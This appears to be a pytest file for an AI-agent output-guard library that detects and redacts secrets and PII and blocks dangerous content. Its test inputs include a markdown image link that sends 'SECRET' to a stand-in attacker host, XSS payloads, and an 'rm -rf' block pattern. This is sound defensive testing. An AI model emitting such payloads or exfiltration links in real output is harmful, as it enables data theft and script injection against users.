from __future__ import annotations

import json

from agentsec.middleware import (
    Action,
    BlockedPatternValidator,
    DangerousContentValidator,
    ExfilLinkValidator,
    JsonSchemaValidator,
    MaxLengthValidator,
    OutputGuard,
    PIIValidator,
    ProtectedStringValidator,
    SecretLeakValidator,
    find_sensitive,
    redact_text,
)
from tests.conftest import (
    fake_anthropic_key,
    fake_aws_key,
    fake_github_token,
    fake_jwt,
    fake_private_key_header,
    fake_slack_token,
)


def test_finds_each_secret_kind():
    text = " ".join(
        [
            fake_aws_key(),
            fake_github_token(),
            fake_slack_token(),
            fake_anthropic_key(),
            fake_jwt(),
            fake_private_key_header(),
        ]
    )
    kinds = {f.kind for f in find_sensitive(text)}
    assert {
        "aws_access_key_id",
        "github_token",
        "slack_token",
        "anthropic_api_key",
        "jwt",
        "private_key_block",
    } <= kinds


def test_redact_replaces_and_never_echoes_secret():
    key = fake_aws_key()
    text = f"use {key} now"
    out, findings = redact_text(text)
    assert key not in out and "[REDACTED:aws_access_key_id]" in out
    assert key not in findings[0].preview(text)


def test_luhn_filters_random_digit_runs():
    assert [f.kind for f in find_sensitive("card 4111 1111 1111 1111")] == ["payment_card"]
    assert find_sensitive("order 1234 5678 9012 3456") == []  # fails Luhn


def test_ssn_detection_and_invalid_ranges():
    assert find_sensitive("ssn 123-45-6789")[0].kind == "us_ssn"
    assert find_sensitive("000-12-3456") == []


def test_pii_can_be_excluded():
    assert find_sensitive("123-45-6789", include_pii=False) == []


def test_secret_validator_redacts_but_delivers():
    res = OutputGuard([SecretLeakValidator()]).process(f"key={fake_aws_key()}")
    assert res.allowed and res.redacted and fake_aws_key() not in res.text


def test_pii_validator_redacts_only_pii():
    v = PIIValidator()
    assert "[REDACTED:us_ssn]" in v.sanitize("id 123-45-6789")
    assert fake_aws_key() in v.sanitize(f"id 123-45-6789 {fake_aws_key()}")


def test_protected_string_blocks_and_ignores_case_and_spacing():
    guard = OutputGuard([ProtectedStringValidator(["SECRET-abc123"])])
    res = guard.process("the value is s e c r e t - A B C 1 2 3")
    assert not res.allowed and res.text == guard.blocked_message


def test_exfil_link_flags_external_image_and_allows_allowlisted():
    v = ExfilLinkValidator(["docs.corp.example"])
    assert v.check("![x](https://docs.corp.example/a.png)") == []
    bad = v.check("![x](https://evil.example/p.png?d=SECRET)")
    assert bad and "image" in bad[0].message
    cleaned = v.sanitize("see ![x](https://evil.example/p.png?d=SECRET)")
    assert "evil.example" not in cleaned


def test_exfil_link_wildcard_and_plain_links_warn_mode():
    v = ExfilLinkValidator(["*.corp.example"], links_action=Action.WARN)
    assert v.check("https://a.corp.example/x") == []
    found = v.check("visit https://evil.example/x")
    assert found and found[0].action == Action.WARN


def test_html_img_tag_detected():
    assert ExfilLinkValidator().check('<img src="https://evil.example/x.gif">')


def test_dangerous_content_blocks():
    guard = OutputGuard([DangerousContentValidator()])
    for payload in [
        "<script>alert(1)</script>",
        "[a](javascript:alert(1))",
        "<img src=x onerror=alert(1)>",
    ]:
        assert not guard.process(payload).allowed
    assert guard.process("plain text and `code`").allowed


def test_max_length_and_blocked_pattern():
    assert not OutputGuard([MaxLengthValidator(5)]).process("toolong").allowed
    assert not OutputGuard([BlockedPatternValidator([r"rm\s+-rf"])]).process("run RM -RF /").allowed


def test_json_schema_validator():
    schema = {
        "type": "object",
        "required": ["action"],
        "properties": {"action": {"enum": ["open", "close"]}},
    }
    guard = OutputGuard([JsonSchemaValidator(schema)])
    assert guard.process(json.dumps({"action": "open"})).allowed
    bad = guard.process(json.dumps({"action": "drop"}))
    assert not bad.allowed and "action" in bad.violations[0].message
    assert not guard.process("not json").allowed


def test_default_guard_combines_layers():
    guard = OutputGuard.default(allowed_hosts=["corp.example"], protected=["CANARY-1"])
    assert guard.process("all good").allowed
    assert not guard.process("leak CANARY-1").allowed
    res = guard.process(f"token {fake_github_token()}")
    assert res.allowed and "[REDACTED" in res.text


def test_block_takes_precedence_over_redact():
    guard = OutputGuard([SecretLeakValidator(), DangerousContentValidator()])
    res = guard.process(f"<script>x</script> {fake_aws_key()}")
    assert not res.allowed
